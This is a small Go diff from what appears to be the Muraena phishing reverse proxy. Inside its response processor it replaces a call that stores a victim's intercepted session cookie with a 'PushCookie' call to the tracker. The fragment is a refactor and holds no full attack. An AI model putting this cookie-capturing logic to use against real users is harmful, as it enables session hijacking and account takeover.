@@ -294,8 +294,7 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 				Secure:   c.Secure,
 			}
 
-			//log.Info("%s", sessCookie)
-			muraena.Tracker.AddToCookieJar(victim.ID, sessCookie)
+			muraena.Tracker.PushCookie(victim, sessCookie)
 		}
 	} else {
 
